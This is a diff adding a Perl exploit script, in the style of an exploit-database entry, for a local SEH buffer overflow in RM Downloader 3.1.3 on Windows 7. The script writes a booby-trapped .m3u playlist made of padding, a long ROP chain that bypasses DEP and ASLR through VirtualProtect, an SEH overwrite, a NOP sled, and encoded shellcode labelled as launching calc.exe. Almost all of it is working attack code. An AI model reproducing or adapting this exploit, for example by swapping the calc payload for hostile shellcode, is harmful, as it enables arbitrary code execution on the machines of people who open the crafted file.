@@ -1,0 +1,115 @@
+#!/usr/bin/perl
+# Exploit Title:	RM Downloader 3.1.3 Local SEH Exploit (Win7 ASLR and DEP Bypass)
+# Date:			July 1, 2010
+# Author:		Node
+# Software Link: 	http://www.mini-stream.net/downloads/RMDownloader.exe
+# Version:		RM Downloader 3.1.3.3.2010.06.26 (Evaluation)
+# Tested on:		Windows 7 Ultimate x64 ENG
+# Notes: 		Only using rop gadgets from RDfilter03.dll (432KB). 
+#			Using exploit from MadjiX and inspiration from corelanc0d3r.
+# Code :
+my $header = "#EXTM3U\n";
+my $pre = "A" x 16240;
+my $rop = pack('V',0x10048875); # PUSH ESP # MOV EAX,1 # POP EBX # ADD ESP,8 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x10023405); # ADD ESP,20 
+$rop = $rop."1111"; # VirtualProtect() placeholder
+$rop = $rop."2222"; #return address placeholder
+$rop = $rop."3333"; #lpAddress placeholder
+$rop = $rop."4444"; #dwsize placeholder
+$rop = $rop."5555"; #flNewProtect placeholder
+$rop = $rop.pack('V',0x10051005); # lpflOldProtect writable address
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x10011F55); # MOV EAX,EBX # POP EBP # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x10012701); # POP EBX # POP ECX 
+$rop = $rop."A" x 4;
+$rop = $rop.pack('V',0xffffffff);
+$rop = $rop.pack('V',0x10040674); # PUSH EAX # POP ESI # POP EBP # MOV EAX,DWORD PTR DS:[ECX+EAX+2] # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x1001229B); # PUSH ESI # ADD AL,5E # POP EBX 
+$rop = $rop.pack('V',0x10011F55); # MOV EAX,EBX # POP EBP # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x1002CF10) x 11; # ADD EAX,80BF(32959) # ADD DH,DH 
+$rop = $rop.pack('V',0x100422FB) x 272; # ADD EAX,20 
+$rop = $rop.pack('V',0x10016DA7) x 7; # INC EAX 
+$rop = $rop.pack('V',0x10028069); # MOV EAX,DWORD PTR DS:[EAX] 
+$rop = $rop.pack('V',0x10046F47) x 395; # DEC EAX
+$rop = $rop.pack('V',0x1002CCD7) x 12; # INC ESI # ADD AL,3 
+$rop = $rop.pack('V',0x10037288) x 12; # SUB AL,3 
+$rop = $rop.pack('V',0x1001C707); # ADD ESP,8 # MOV DWORD PTR DS:[ESI],EAX # MOV EAX,ESI # POP ESI 
+$rop = $rop."A" x 12;
+$rop = $rop.pack('V',0x10040674); # PUSH EAX # POP ESI # POP EBP # MOV EAX,DWORD PTR DS:[ECX+EAX+2] # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x1001229B); # PUSH ESI # ADD AL,5E # POP EBX 
+$rop = $rop.pack('V',0x10011F55); # MOV EAX,EBX # POP EBP # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x1002CF10); # ADD EAX,80BF(32959) # ADD DH,DH
+$rop = $rop.pack('V',0x1002CCD7) x 4; # INC ESI # ADD AL,3 
+$rop = $rop.pack('V',0x10037288) x 4; # SUB AL,3 
+$rop = $rop.pack('V',0x1001C707); # ADD ESP,8 # MOV DWORD PTR DS:[ESI],EAX # MOV EAX,ESI # POP ESI 
+$rop = $rop."A" x 12;
+$rop = $rop.pack('V',0x10040674); # PUSH EAX # POP ESI # POP EBP # MOV EAX,DWORD PTR DS:[ECX+EAX+2] # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x1001229B); # PUSH ESI # ADD AL,5E # POP EBX 
+$rop = $rop.pack('V',0x10011F55); # MOV EAX,EBX # POP EBP # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x1002CF10); # ADD EAX,80BF(32959) # ADD DH,DH
+$rop = $rop.pack('V',0x1002CCD7) x 4; # INC ESI # ADD AL,3 
+$rop = $rop.pack('V',0x10037288) x 4; # SUB AL,3 
+$rop = $rop.pack('V',0x1001C707); # ADD ESP,8 # MOV DWORD PTR DS:[ESI],EAX # MOV EAX,ESI # POP ESI 
+$rop = $rop."A" x 12;
+$rop = $rop.pack('V',0x10040674); # PUSH EAX # POP ESI # POP EBP # MOV EAX,DWORD PTR DS:[ECX+EAX+2] # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x1001229B); # PUSH ESI # ADD AL,5E # POP EBX 
+$rop = $rop.pack('V',0x10011F55); # MOV EAX,EBX # POP EBP # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x1001011B); # XOR EAX,EAX 
+$rop = $rop.pack('V',0x10031DAC); # ADD EAX,100 # POP EBP 
+$rop = $rop."A" x 4;
+$rop = $rop.pack('V',0x10031DAC); # ADD EAX,100 # POP EBP 
+$rop = $rop."A" x 4;
+$rop = $rop.pack('V',0x10031DAC); # ADD EAX,100 # POP EBP 
+$rop = $rop."A" x 4;
+$rop = $rop.pack('V',0x1002CCD7) x 4; # INC ESI # ADD AL,3 
+$rop = $rop.pack('V',0x10037288) x 4; # SUB AL,3 
+$rop = $rop.pack('V',0x1001C707); # ADD ESP,8 # MOV DWORD PTR DS:[ESI],EAX # MOV EAX,ESI # POP ESI 
+$rop = $rop."A" x 12;
+$rop = $rop.pack('V',0x10040674); # PUSH EAX # POP ESI # POP EBP # MOV EAX,DWORD PTR DS:[ECX+EAX+2] # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x1001229B); # PUSH ESI # ADD AL,5E # POP EBX 
+$rop = $rop.pack('V',0x10011F55); # MOV EAX,EBX # POP EBP # POP EBX 
+$rop = $rop."A" x 8;
+$rop = $rop.pack('V',0x1001011B); # XOR EAX,EAX 
+$rop = $rop.pack('V',0x100422FB) x 2; # ADD EAX,20 
+$rop = $rop.pack('V',0x1002CCD7) x 4; # INC ESI # ADD AL,3 
+$rop = $rop.pack('V',0x10037288) x 4; # SUB AL,3 
+$rop = $rop.pack('V',0x1001C707); # ADD ESP,8 # MOV DWORD PTR DS:[ESI],EAX # MOV EAX,ESI # POP ESI 
+$rop = $rop."A" x 12;
+$rop = $rop.pack('V',0x10046F47) x 16; # DEC EAX
+$rop = $rop.pack('V',0x1002FF96); # XCHG EAX,ESP
+my $space= "A" x (43492 - length($pre) - length($rop));
+my $seh=pack('V',0x10017928);  #ADD ESP,4404 
+my $nops = "\x90" x 5732;
+my $shellcode = 
+"\xb8\x7b\x39\xeb\x12\x29\xc9\xb1\x33\xd9\xe1\xd9\x74\x24" .
+"\xf4\x5b\x31\x43\x0f\x83\xeb\xfc\x03\x43\x70\xdb\x1e\xee" .
+"\x6e\x92\xe1\x0f\x6e\xc5\x68\xea\x5f\xd7\x0f\x7e\xcd\xe7" .
+"\x44\xd2\xfd\x8c\x09\xc7\x76\xe0\x85\xe8\x3f\x4f\xf0\xc7" .
+"\xc0\x61\x3c\x8b\x02\xe3\xc0\xd6\x56\xc3\xf9\x18\xab\x02" .
+"\x3d\x44\x43\x56\x96\x02\xf1\x47\x93\x57\xc9\x66\x73\xdc" .
+"\x71\x11\xf6\x23\x05\xab\xf9\x73\xb5\xa0\xb2\x6b\xbe\xef" .
+"\x62\x8d\x13\xec\x5f\xc4\x18\xc7\x14\xd7\xc8\x19\xd4\xe9" .
+"\x34\xf5\xeb\xc5\xb9\x07\x2b\xe1\x21\x72\x47\x11\xdc\x85" .
+"\x9c\x6b\x3a\x03\x01\xcb\xc9\xb3\xe1\xed\x1e\x25\x61\xe1" .
+"\xeb\x21\x2d\xe6\xea\xe6\x45\x12\x67\x09\x8a\x92\x33\x2e" .
+"\x0e\xfe\xe0\x4f\x17\x5a\x47\x6f\x47\x02\x38\xd5\x03\xa1" .
+"\x2d\x6f\x4e\xac\xb0\xfd\xf4\x89\xb2\xfd\xf6\xb9\xda\xcc" .
+"\x7d\x56\x9d\xd0\x57\x12\x51\x9b\xfa\x33\xf9\x42\x6f\x06" .
+"\x64\x75\x45\x45\x90\xf6\x6c\x36\x67\xe6\x04\x33\x2c\xa0" .
+"\xf5\x49\x3d\x45\xfa\xfe\x3e\x4c\x99\x61\xac\x0c\x70\x07" .
+"\x54\xb6\x8c\xcd"; #Calc.exe
+my $end= "\x90" x (20000 - $nops);
+open(MYFILE,'>>RMdownloader.m3u');
+print MYFILE $header.$pre.$rop.$space.$seh.$nops.$shellcode.$end;
+close(MYFILE);
